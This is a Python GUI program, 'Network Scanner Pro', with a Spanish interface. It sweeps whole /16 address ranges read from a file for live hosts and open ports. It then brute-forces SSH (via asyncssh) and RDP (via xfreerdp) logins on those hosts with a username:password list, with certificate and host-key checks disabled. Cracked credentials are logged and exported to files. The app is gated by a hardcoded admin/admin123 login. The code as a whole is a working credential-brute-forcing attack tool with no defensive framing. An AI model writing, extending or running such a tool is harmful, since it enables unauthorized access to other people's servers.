import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import asyncio
import threading
import asyncssh
import subprocess
import configparser
from datetime import datetime
from queue import Queue
from cryptography.fernet import Fernet
import base64
import importlib.util
import json

class CredentialManager:
    def __init__(self):
        self.key = self._load_or_create_key()
        self.cipher = Fernet(self.key)
    
    def _load_or_create_key(self):
        key_path = os.path.join(os.path.dirname(__file__), "secret.key")
        if os.path.exists(key_path):
            with open(key_path, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_path, 'wb') as f:
                f.write(key)
            return key
    
    def encrypt_credentials(self, user, password):
        cred_str = f"{user}:{password}"
        return self.cipher.encrypt(cred_str.encode()).decode()
    
    def decrypt_credentials(self, encrypted):
        decrypted = self.cipher.decrypt(encrypted.encode()).decode()
        return decrypted.split(":")

class NetworkScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Scanner Pro")
        self.root.geometry("750x650")
        
        self.root.overrideredirect(True)
        self.root.wm_attributes('-alpha', 0.95)
        self.root.configure(bg="#262626")
        self.root.resizable(True, True)
        
        self.x = 0
        self.y = 0
        self.root.bind("<Button-1>", self.start_move)
        self.root.bind("<ButtonRelease-1>", self.stop_move)
        self.root.bind("<B1-Motion>", self.on_motion)

        self.style = ttk.Style()
        self.setup_style()
        
        self.scanning = False
        self.stop_scan = False
        self.SUBREDES = []
        self.CONFIG = {}
        self.USERS = {}
        self._log_buffer = []
        self._result_queue = Queue()
        self.scan_history = []
        
        self.cred_manager = CredentialManager()
        
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        self.create_widgets()
        self.load_default_config()
        self.update_file_counts()
        
        self.root.after(100, self._process_results)
        self.root.after(100, self._flush_log_buffer)
        
        self.show_auth_window()

    def setup_style(self):
        self.style.theme_use('clam')
        bg_color = "#1e1e2d"
        fg_color = "#ffffff"
        entry_bg = "#2d2d3d"
        button_bg = "#3a3a4a"
        active_bg = "#4a4a5a"
        highlight_color = "#4a6baf"
        
        self.style.configure(".", background=bg_color, foreground=fg_color, fieldbackground=entry_bg)
        self.style.configure("TFrame", background=bg_color)
        self.style.configure("TLabel", background=bg_color, foreground=fg_color)
        self.style.configure("TButton", background=button_bg, foreground=fg_color, borderwidth=1)
        self.style.map("TButton", 
                      background=[('active', active_bg), ('disabled', bg_color)],
                      foreground=[('disabled', '#777777')])
        self.style.configure("TEntry", fieldbackground=entry_bg, foreground=fg_color, insertcolor=fg_color)
        self.style.configure("TCombobox", fieldbackground=entry_bg, foreground=fg_color)
        self.style.configure("TNotebook", background=bg_color, borderwidth=0)
        self.style.configure("TNotebook.Tab", background=button_bg, foreground=fg_color, padding=[5, 3])
        self.style.map("TNotebook.Tab", 
                      background=[('selected', highlight_color), ('active', active_bg)])
        self.style.configure("TCheckbutton", background=bg_color, foreground=fg_color)
        self.root.configure(background=bg_color)

        close_btn = tk.Button(self.root, text="✕", command=self.root.destroy,
                            bg="#ff5555", fg="white", bd=0, highlightthickness=0,
                            font=("Arial", 12, "bold"), activebackground="#ff0000")
        close_btn.place(relx=0.99, rely=0.01, anchor="ne", width=25, height=25)

        minimize_btn = tk.Button(self.root, text="–", command=self.root.iconify,
                               bg="#3a3a4a", fg="white", bd=0, highlightthickness=0,
                               font=("Arial", 12, "bold"), activebackground="#4a4a5a")
        minimize_btn.place(relx=0.95, rely=0.01, anchor="ne", width=25, height=25)

    def show_auth_window(self):
        self.auth_window = tk.Toplevel(self.root)
        self.auth_window.title("Autenticación")
        self.auth_window.geometry("300x200")
        self.auth_window.resizable(False, False)
        self.auth_window.overrideredirect(True)
        self.auth_window.configure(bg="#1e1e2d")
        
        window_width = 300
        window_height = 200
        screen_width = self.auth_window.winfo_screenwidth()
        screen_height = self.auth_window.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        self.auth_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        ttk.Label(self.auth_window, text="Acceso al Sistema", font=("Arial", 12, "bold")).pack(pady=10)
        
        ttk.Label(self.auth_window, text="Usuario:").pack(pady=5)
        self.auth_user = ttk.Entry(self.auth_window)
        self.auth_user.pack(pady=5)
        
        ttk.Label(self.auth_window, text="Contraseña:").pack(pady=5)
        self.auth_pass = ttk.Entry(self.auth_window, show="*")
        self.auth_pass.pack(pady=5)
        
        ttk.Button(self.auth_window, text="Ingresar", command=self.check_credentials).pack(pady=10)
        
        self.root.withdraw()
        self.auth_window.protocol("WM_DELETE_WINDOW", self.root.destroy)

    def check_credentials(self):
        user = self.auth_user.get()
        password = self.auth_pass.get()
        
        if user == "admin" and password == "admin123":
            self.auth_window.destroy()
            self.root.deiconify()
            self.center_window()
        else:
            messagebox.showerror("Error", "Credenciales incorrectas")
            self.auth_pass.delete(0, tk.END)

    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")

    def create_widgets(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.create_main_tab()

    def create_main_tab(self):
        self.main_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.main_frame, text="Principal")
        
        # Panel izquierdo (configuración)
        left_panel = ttk.Frame(self.main_frame, width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        left_panel.pack_propagate(False)
        
        # Panel derecho (resultados y logs)
        right_panel = ttk.Frame(self.main_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configuración (panel izquierdo)
        config_frame = ttk.LabelFrame(left_panel, text="Configuración", padding=5)
        config_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        file_frame = ttk.LabelFrame(config_frame, text="Archivos", padding=5)
        file_frame.pack(fill=tk.X, padx=5, pady=3)
        
        ttk.Label(file_frame, text="Archivo de IPs:").pack(anchor=tk.W)
        ip_file_container = ttk.Frame(file_frame)
        ip_file_container.pack(fill=tk.X, pady=2)
        self.ip_file_entry = ttk.Entry(ip_file_container)
        self.ip_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.ip_file_entry.insert(0, os.path.join(os.path.dirname(__file__), "ip.txt"))
        ttk.Button(ip_file_container, text="...", width=3,
                 command=lambda: self.browse_file(self.ip_file_entry)).pack(side=tk.RIGHT, padx=3)
        self.ip_count_label = ttk.Label(file_frame, text="0 IPs cargadas")
        self.ip_count_label.pack(anchor=tk.W)
        
        # Credenciales
        ttk.Label(file_frame, text="Archivo de credenciales:").pack(anchor=tk.W, pady=(5,0))
        creds_file_container = ttk.Frame(file_frame)
        creds_file_container.pack(fill=tk.X, pady=2)
        self.creds_file_entry = ttk.Entry(creds_file_container)
        self.creds_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.creds_file_entry.insert(0, os.path.join(os.path.dirname(__file__), "creds.txt"))
        ttk.Button(creds_file_container, text="...", width=3,
                 command=lambda: self.browse_file(self.creds_file_entry)).pack(side=tk.RIGHT, padx=3)
        self.creds_count_label = ttk.Label(file_frame, text="0 credenciales cargadas")
        self.creds_count_label.pack(anchor=tk.W)
        
        # Parámetros de escaneo
        params_frame = ttk.LabelFrame(config_frame, text="Parámetros", padding=5)
        params_frame.pack(fill=tk.X, padx=5, pady=3)
        
        ttk.Label(params_frame, text="Hilos:").grid(row=0, column=0, sticky=tk.W, padx=3, pady=2)
        self.threads_entry = ttk.Entry(params_frame, width=8)
        self.threads_entry.grid(row=0, column=1, sticky=tk.W, padx=3, pady=2)
        
        ttk.Label(params_frame, text="Timeout:").grid(row=1, column=0, sticky=tk.W, padx=3, pady=2)
        self.timeout_entry = ttk.Entry(params_frame, width=8)
        self.timeout_entry.grid(row=1, column=1, sticky=tk.W, padx=3, pady=2)
        
        ttk.Label(params_frame, text="Intentos:").grid(row=2, column=0, sticky=tk.W, padx=3, pady=2)
        self.attempts_entry = ttk.Entry(params_frame, width=8)
        self.attempts_entry.grid(row=2, column=1, sticky=tk.W, padx=3, pady=2)
        
        ttk.Label(params_frame, text="Puerto RDP:").grid(row=3, column=0, sticky=tk.W, padx=3, pady=2)
        self.default_port_entry = ttk.Entry(params_frame, width=8)
        self.default_port_entry.grid(row=3, column=1, sticky=tk.W, padx=3, pady=2)
        
        options_frame = ttk.Frame(params_frame)
        options_frame.grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        self.check_ssh_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="SSH", variable=self.check_ssh_var).pack(side=tk.LEFT, padx=3)
        
        self.check_rdp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="RDP", variable=self.check_rdp_var).pack(side=tk.LEFT, padx=3)
        
        self.full_scan_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="Escaneo completo", variable=self.full_scan_var).pack(side=tk.LEFT, padx=3)
        
        ttk.Button(config_frame, text="Guardar Configuración", command=self.save_config).pack(pady=5)

        # Panel derecho - Estadísticas y resultados
        stats_frame = ttk.LabelFrame(right_panel, text="Estadísticas", padding=10)
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill=tk.X)

        row1 = ttk.Frame(stats_grid)
        row1.pack(fill=tk.X, pady=2)
        
        self.stats_labels = {
            'ips': ttk.Label(row1, text="IPs escaneadas: 0"),
            'activas': ttk.Label(row1, text="IPs activas: 0"),
            'puertos': ttk.Label(row1, text="Puertos abiertos: 0")
        }
        
        for label in [self.stats_labels['ips'], self.stats_labels['activas'], self.stats_labels['puertos']]:
            label.pack(side=tk.LEFT, expand=True, anchor=tk.W)
        
        row2 = ttk.Frame(stats_grid)
        row2.pack(fill=tk.X, pady=2)
        
        self.stats_labels.update({
            'creds': ttk.Label(row2, text="Credenciales válidas: 0"),
            'tiempo': ttk.Label(row2, text="Tiempo transcurrido: 00:00:00")
        })
        
        for label in [self.stats_labels['creds'], self.stats_labels['tiempo']]:
            label.pack(side=tk.LEFT, expand=True, anchor=tk.W)
        
        self.progress_chart = tk.Canvas(stats_frame, bg="#2d2d3d", height=50)
        self.progress_chart.pack(fill=tk.X, pady=5)

        # Controles de escaneo
        control_frame = ttk.Frame(right_panel)
        control_frame.pack(fill=tk.X, padx=5, pady=3)

        btn_container = ttk.Frame(control_frame)
        btn_container.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.start_button = ttk.Button(btn_container, text="Iniciar Escaneo", command=self.start_scan)
        self.start_button.pack(side=tk.LEFT, padx=3)
        
        self.stop_button = ttk.Button(btn_container, text="Detener", 
                                    state=tk.DISABLED, command=self.stop_scanning)
        self.stop_button.pack(side=tk.LEFT, padx=3)

        self.scan_method = ttk.Combobox(control_frame, values=["Rápido", "Estándar", "Completo"], state="readonly")
        self.scan_method.set("Estándar")
        self.scan_method.pack(side=tk.RIGHT, padx=10)

        self.progress = ttk.Progressbar(right_panel, orient=tk.HORIZONTAL, mode='determinate')
        self.progress.pack(fill=tk.X, padx=5, pady=3)

        # Resultados en pestañas
        results_notebook = ttk.Notebook(right_panel)
        results_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Pestaña de logs
        log_frame = ttk.Frame(results_notebook)
        results_notebook.add(log_frame, text="Registro")
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, 
                                                width=70, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.configure(bg="#2d2d3d", fg="#ffffff", insertbackground="#ffffff")
        
        # Pestaña de IPs
        ip_frame = ttk.Frame(results_notebook)
        results_notebook.add(ip_frame, text="IPs Activas")
        self.ip_text = scrolledtext.ScrolledText(ip_frame, wrap=tk.WORD, height=8)
        self.ip_text.pack(fill=tk.BOTH, expand=True)
        self.ip_text.configure(bg="#2d2d3d", fg="#ffffff", insertbackground="#ffffff")
        
        # Pestaña de Puertos
        ports_frame = ttk.Frame(results_notebook)
        results_notebook.add(ports_frame, text="Puertos Abiertos")
        self.ports_text = scrolledtext.ScrolledText(ports_frame, wrap=tk.WORD, height=8)
        self.ports_text.pack(fill=tk.BOTH, expand=True)
        self.ports_text.configure(bg="#2d2d3d", fg="#ffffff", insertbackground="#ffffff")
        
        # Pestaña de SSH
        ssh_frame = ttk.Frame(results_notebook)
        results_notebook.add(ssh_frame, text="SSH")
        self.ssh_text = scrolledtext.ScrolledText(ssh_frame, wrap=tk.WORD, height=8)
        self.ssh_text.pack(fill=tk.BOTH, expand=True)
        self.ssh_text.configure(bg="#2d2d3d", fg="#ffffff", insertbackground="#ffffff")
        
        # Pestaña de RDP
        rdp_frame = ttk.Frame(results_notebook)
        results_notebook.add(rdp_frame, text="RDP")
        self.rdp_text = scrolledtext.ScrolledText(rdp_frame, wrap=tk.WORD, height=8)
        self.rdp_text.pack(fill=tk.BOTH, expand=True)
        self.rdp_text.configure(bg="#2d2d3d", fg="#ffffff", insertbackground="#ffffff")
        
        # Botones de exportación
        export_frame = ttk.Frame(right_panel)
        export_frame.pack(fill=tk.X, padx=5, pady=3)
        
        ttk.Button(export_frame, text="Exportar IPs", 
                 command=lambda: self.export_results("ip_activas.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text="Exportar Puertos", 
                 command=lambda: self.export_results("puertos_abiertos.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text="Exportar SSH", 
                 command=lambda: self.export_results("ssh_success.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text="Exportar RDP", 
                 command=lambda: self.export_results("rdp_success.txt")).pack(side=tk.LEFT, padx=2)

    def start_move(self, event):
        self.x = event.x
        self.y = event.y

    def stop_move(self, event):
        self.x = None
        self.y = None

    def on_motion(self, event):
        if self.x is not None and self.y is not None:
            x = (event.x_root - self.x)
            y = (event.y_root - self.y)
            self.root.geometry(f"+{x}+{y}")

    def browse_file(self, entry_widget):
        filename = filedialog.askopenfilename()
        if filename:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, filename)
            self.update_file_counts()

    def update_file_counts(self):
        ip_file = self.ip_file_entry.get()
        ip_count = 0
        if os.path.exists(ip_file):
            try:
                with open(ip_file, 'r', encoding='utf-8') as f:
                    ip_count = len(f.readlines())
            except UnicodeDecodeError:
                with open(ip_file, 'r', encoding='latin-1') as f:
                    ip_count = len(f.readlines())
        self.ip_count_label.config(text=f"{ip_count} IPs cargadas")
        
        creds_file = self.creds_file_entry.get()
        creds_count = 0
        if os.path.exists(creds_file):
            try:
                with open(creds_file, 'r', encoding='utf-8') as f:
                    creds_count = len(f.readlines())
            except UnicodeDecodeError:
                with open(creds_file, 'r', encoding='latin-1') as f:
                    creds_count = len(f.readlines())
        self.creds_count_label.config(text=f"{creds_count} credenciales cargadas")
        
        self._load_users()

    def _load_users(self):
        creds_file = self.creds_file_entry.get()
        self.USERS = {}
        
        if os.path.exists(creds_file):
            try:
                with open(creds_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        if ':' in line:
                            user, passwd = line.strip().split(':', 1)
                            self.USERS[user] = passwd
            except UnicodeDecodeError:
                with open(creds_file, 'r', encoding='latin-1') as f:
                    for line in f:
                        if ':' in line:
                            user, passwd = line.strip().split(':', 1)
                            self.USERS[user] = passwd

    def load_default_config(self):
        config_path = os.path.join(os.path.dirname(__file__), "config.cfg")
        config = configparser.ConfigParser()
        
        defaults = {
            "General": {
                "Threads": "20",
                "Timeout": "10",
                "Attempts": "2",
                "DEFAULTPORT": "3389",
                "CHECK_SSH": "True",
                "CHECK_RDP": "True",
                "FULL_SCAN": "False"
            },
            "Performance": {
                "max_pending_tasks": "500",
                "update_interval": "100",
                "batch_size": "50"
            },
        }
        
        if os.path.exists(config_path):
            config.read(config_path)
        else:
            config.read_dict(defaults)
            with open(config_path, 'w') as configfile:
                config.write(configfile)
        
        self.threads_entry.delete(0, tk.END)
        self.threads_entry.insert(0, config.get("General", "Threads", fallback="20"))
        
        self.timeout_entry.delete(0, tk.END)
        self.timeout_entry.insert(0, config.get("General", "Timeout", fallback="10"))
        
        self.attempts_entry.delete(0, tk.END)
        self.attempts_entry.insert(0, config.get("General", "Attempts", fallback="2"))
        
        self.default_port_entry.delete(0, tk.END)
        self.default_port_entry.insert(0, config.get("General", "DEFAULTPORT", fallback="3389"))
        
        self.check_ssh_var.set(config.getboolean("General", "CHECK_SSH", fallback=True))
        self.check_rdp_var.set(config.getboolean("General", "CHECK_RDP", fallback=True))
        self.full_scan_var.set(config.getboolean("General", "FULL_SCAN", fallback=False))

        self.CONFIG = {
            "threads": config.getint("General", "Threads", fallback=20),
            "timeout": config.getint("General", "Timeout", fallback=10),
            "attempts": config.getint("General", "Attempts", fallback=2),
            "default_port": config.getint("General", "DEFAULTPORT", fallback=3389),
            "check_ssh": config.getboolean("General", "CHECK_SSH", fallback=True),
            "check_rdp": config.getboolean("General", "CHECK_RDP", fallback=True),
            "full_scan": config.getboolean("General", "FULL_SCAN", fallback=False),
            "max_pending": config.getint("Performance", "max_pending_tasks", fallback=500),
            "update_interval": config.getint("Performance", "update_interval", fallback=100),
            "batch_size": config.getint("Performance", "batch_size", fallback=50),
        }

    def save_config(self):
        config = configparser.ConfigParser()
        config["General"] = {
            "Threads": self.threads_entry.get(),
            "Timeout": self.timeout_entry.get(),
            "Attempts": self.attempts_entry.get(),
            "DEFAULTPORT": self.default_port_entry.get(),
            "CHECK_SSH": str(self.check_ssh_var.get()),
            "CHECK_RDP": str(self.check_rdp_var.get()),
            "FULL_SCAN": str(self.full_scan_var.get())
        }
        
        config["Performance"] = {
            "max_pending_tasks": str(self.CONFIG.get("max_pending", 500)),
            "update_interval": str(self.CONFIG.get("update_interval", 100)),
            "batch_size": str(self.CONFIG.get("batch_size", 50))
        }
        
        config_path = os.path.join(os.path.dirname(__file__), "config.cfg")
        with open(config_path, 'w') as configfile:
            config.write(configfile)
        
        self.load_default_config()
        messagebox.showinfo("Configuración", "Configuración guardada correctamente")

    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self._log_buffer.append(f"[{timestamp}] {message}\n")

    def _flush_log_buffer(self):
        if self._log_buffer:
            self.log_text.insert(tk.END, ''.join(self._log_buffer))
            self.log_text.see(tk.END)
            self._log_buffer.clear()
        self.root.after(self.CONFIG["update_interval"], self._flush_log_buffer)

    def _process_results(self):
        while not self._result_queue.empty():
            result_type, data = self._result_queue.get()
            if result_type == "ip":
                self.ip_text.insert(tk.END, data + '\n')
                self.ip_text.see(tk.END)
                self.update_stat('activas', len(self.ip_text.get("1.0", tk.END).splitlines()))
            elif result_type == "port":
                self.ports_text.insert(tk.END, data + '\n')
                self.ports_text.see(tk.END)
                self.update_stat('puertos', len(self.ports_text.get("1.0", tk.END).splitlines()))
            elif result_type == "ssh":
                self.ssh_text.insert(tk.END, data + '\n')
                self.ssh_text.see(tk.END)
                self.update_stat('creds', len(self.ssh_text.get("1.0", tk.END).splitlines()))
            elif result_type == "rdp":
                self.rdp_text.insert(tk.END, data + '\n')
                self.rdp_text.see(tk.END)
                self.update_stat('creds', len(self.rdp_text.get("1.0", tk.END).splitlines()))
        self.root.after(self.CONFIG["update_interval"], self._process_results)

    def update_stat(self, stat, value):
        if stat in self.stats_labels:
            text = self.stats_labels[stat].cget("text").split(":")[0]
            self.stats_labels[stat].config(text=f"{text}: {value}")

    def start_scan(self):
        if self.scanning:
            return
        
        self.scanning = True
        self.stop_scan = False
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        
        self.ip_text.delete(1.0, tk.END)
        self.ports_text.delete(1.0, tk.END)
        self.ssh_text.delete(1.0, tk.END)
        self.rdp_text.delete(1.0, tk.END)
        
        for stat in self.stats_labels:
            text = self.stats_labels[stat].cget("text").split(":")[0]
            self.stats_labels[stat].config(text=f"{text}: 0")
        
        method = self.scan_method.get()
        if method == "Rápido":
            self.CONFIG["full_scan"] = False
        elif method == "Completo":
            self.CONFIG["full_scan"] = True
        
        self._load_users()
        
        self.start_time = datetime.now()
        self.update_timer()
        
        scan_thread = threading.Thread(target=self.run_scan, daemon=True)
        scan_thread.start()

    def update_timer(self):
        if self.scanning:
            elapsed = datetime.now() - self.start_time
            elapsed_str = str(elapsed).split('.')[0]
            self.stats_labels['tiempo'].config(text=f"Tiempo transcurrido: {elapsed_str}")
            self.root.after(1000, self.update_timer)

    def stop_scanning(self):
        self.stop_scan = True
        self.log_message("Deteniendo escaneo...")

    def cargar_octetos(self, file_path):
        self.SUBREDES = []
        with open(file_path, 'r') as f:
            for linea in f:
                partes = linea.strip().split('.')
                if len(partes) >= 2:
                    self.SUBREDES.append(f"{partes[0]}.{partes[1]}")

    async def scan_tcp(self, ip, port):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), 
                timeout=self.CONFIG["timeout"]
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def escanear_ip(self, ip):
        puertos_comunes = [80, 443, 22, 21, 3306, 23, 8080]
        for port in puertos_comunes:
            if await self.scan_tcp(ip, port):
                return ip
        return None

    async def escanear_red(self, octeto):
        chunk_size = 1000
        ips = [f"{octeto}.{i}.{j}" for i in range(256) for j in range(1, 255)]
        
        for i in range(0, len(ips), chunk_size):
            if self.stop_scan:
                break
                
            chunk = ips[i:i + chunk_size]
            resultados = await asyncio.gather(*[self.escanear_ip(ip) for ip in chunk])
            activas = [ip for ip in resultados if ip]
            
            if activas:
                self._result_queue.put(("ip", '\n'.join(activas)))
                self.update_stat('ips', len(self.ip_text.get("1.0", tk.END).splitlines()))
            
            await asyncio.sleep(0)

    async def escanear_puertos(self, ip, puertos):
        puertos_comunes = [21, 22, 23, 80, 443, 3389, 8080, 3306]
        abiertos = []
        
        resultados_comunes = await asyncio.gather(*[self.scan_tcp(ip, p) for p in puertos_comunes])
        abiertos.extend([p for i, p in enumerate(puertos_comunes) if resultados_comunes[i]])
        
        if 22 in abiertos and self.CONFIG["check_ssh"]:
            await self.testear_servicios(ip, 22)
        if self.CONFIG["default_port"] in abiertos and self.CONFIG["check_rdp"]:
            await self.testear_servicios(ip, self.CONFIG["default_port"])
        
        if not self.stop_scan and self.CONFIG["full_scan"]:
            otros_puertos = [p for p in puertos if p not in puertos_comunes]
            for i in range(0, len(otros_puertos), 1000):
                if self.stop_scan:
                    break
                bloque = otros_puertos[i:i+1000]
                resultados = await asyncio.gather(*[self.scan_tcp(ip, p) for p in bloque])
                abiertos.extend([p for i, p in enumerate(bloque) if resultados[i]])
        
        return ip, abiertos

    async def probar_credenciales_ssh(self, ip, puerto):
        batch_size = self.CONFIG["batch_size"]
        users = list(self.USERS.items())
        
        for i in range(0, len(users), batch_size):
            if self.stop_scan:
                break
                
            batch = users[i:i + batch_size]
            tasks = []
            
            for user, passwd in batch:
                tasks.append(self.probar_ssh(ip, puerto, user, passwd))
            
            results = await asyncio.gather(*tasks)
            for j, success in enumerate(results):
                if success:
                    user, passwd = batch[j]
                    self._result_queue.put(("ssh", f"{ip}:{puerto} - {user}:{passwd}"))
                    self.update_stat('creds', len(self.ssh_text.get("1.0", tk.END).splitlines()))

    async def probar_credenciales_rdp(self, ip, puerto):
        batch_size = self.CONFIG["batch_size"]
        users = list(self.USERS.items())
        
        for i in range(0, len(users), batch_size):
            if self.stop_scan:
                break
                
            batch = users[i:i + batch_size]
            tasks = []
            
            for user, passwd in batch:
                tasks.append(self.loop.run_in_executor(
                    None,
                    lambda u=user, p=passwd: self.probar_rdp(ip, puerto, u, p))
                )
            
            results = await asyncio.gather(*tasks)
            for j, success in enumerate(results):
                if success:
                    user, passwd = batch[j]
                    self._result_queue.put(("rdp", f"{ip}:{puerto} - {user}:{passwd}"))
                    self.update_stat('creds', len(self.rdp_text.get("1.0", tk.END).splitlines()))

    async def probar_ssh(self, ip, puerto, user, passwd):
        try:
            conn = await asyncssh.connect(
                ip, 
                port=puerto, 
                username=user, 
                password=passwd, 
                known_hosts=None,
                connect_timeout=self.CONFIG["timeout"]
            )
            await conn.close()
            self.log_message(f"[SSH OK] {ip}:{puerto} - {user}:{passwd}")
            return True
        except Exception as e:
            return False

    def probar_rdp(self, ip, puerto, user, passwd):
        cmd = [
            "xfreerdp", 
            f"/v:{ip}:{puerto}", 
            f"/u:{user}", 
            f"/p:{passwd}",
            "/cert:ignore", 
            f"/timeout:{self.CONFIG['timeout']*1000}"
        ]
        try:
            result = subprocess.run(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                timeout=self.CONFIG["timeout"]
            )
            salida = result.stdout.decode(errors='ignore') + result.stderr.decode(errors='ignore')
            if "connected to" in salida or "Authentication only" in salida:
                self.log_message(f"[RDP OK] {ip}:{puerto} - {user}:{passwd}")
                return True
        except Exception as e:
            pass
        return False

    async def testear_servicios(self, ip, puerto):
        if not self.stop_scan:
            if puerto == 22 and self.CONFIG["check_ssh"]:
                await self.probar_credenciales_ssh(ip, puerto)
            elif puerto == self.CONFIG["default_port"] and self.CONFIG["check_rdp"]:
                await self.probar_credenciales_rdp(ip, puerto)

    async def main_scan(self):
        ip_file = self.ip_file_entry.get()
        if not os.path.exists(ip_file):
            self.log_message("Error: Archivo de IPs no encontrado")
            return
            
        self.cargar_octetos(ip_file)
        ip_activas = []

        for red in self.SUBREDES:
            if self.stop_scan:
                break
                
            await self.escanear_red(red)

        ip_activas = [ip.strip() for ip in self.ip_text.get("1.0", tk.END).splitlines() if ip.strip()]
        self.update_stat('activas', len(ip_activas))

        if not ip_activas:
            self.log_message("No se encontraron IPs activas")
            return

        self.log_message("Escaneando puertos abiertos...")
        puertos = list(range(1, 65536)) if self.CONFIG["full_scan"] else [21, 22, 23, 80, 443, 3389, 8080, 3306]
        
        for ip in ip_activas:
            if self.stop_scan:
                break
                
            ip, abiertos = await self.escanear_puertos(ip, puertos)
            if abiertos:
                self._result_queue.put(("port", f"{ip}: {', '.join(map(str, abiertos))}"))
                self.update_stat('puertos', len(self.ports_text.get("1.0", tk.END).splitlines()))

    def run_scan(self):
        async def wrapper():
            await self.main_scan()
            self.scanning = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            
            if not self.stop_scan:
                self.log_message("Escaneo completado")
                self.save_scan_history()
            else:
                self.log_message("Escaneo detenido")
        
        try:
            self.loop.run_until_complete(wrapper())
        except Exception as e:
            self.log_message(f"Error durante el escaneo: {str(e)}")
            self.scanning = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def export_results(self, filename):
        content = ""
        if filename == "ip_activas.txt":
            content = self.ip_text.get(1.0, tk.END)
        elif filename == "puertos_abiertos.txt":
            content = self.ports_text.get(1.0, tk.END)
        elif filename == "ssh_success.txt":
            content = self.ssh_text.get(1.0, tk.END)
        elif filename == "rdp_success.txt":
            content = self.rdp_text.get(1.0, tk.END)
        
        if not content.strip():
            messagebox.showwarning("Exportar", f"No hay datos para exportar a {filename}")
            return
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=filename,
            filetypes=[("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(content)
                messagebox.showinfo("Exportar", f"Datos exportados correctamente a {file_path}")
            except Exception as e:
                messagebox.showerror("Exportar", f"Error al exportar: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkScannerApp(root)
    root.mainloop()
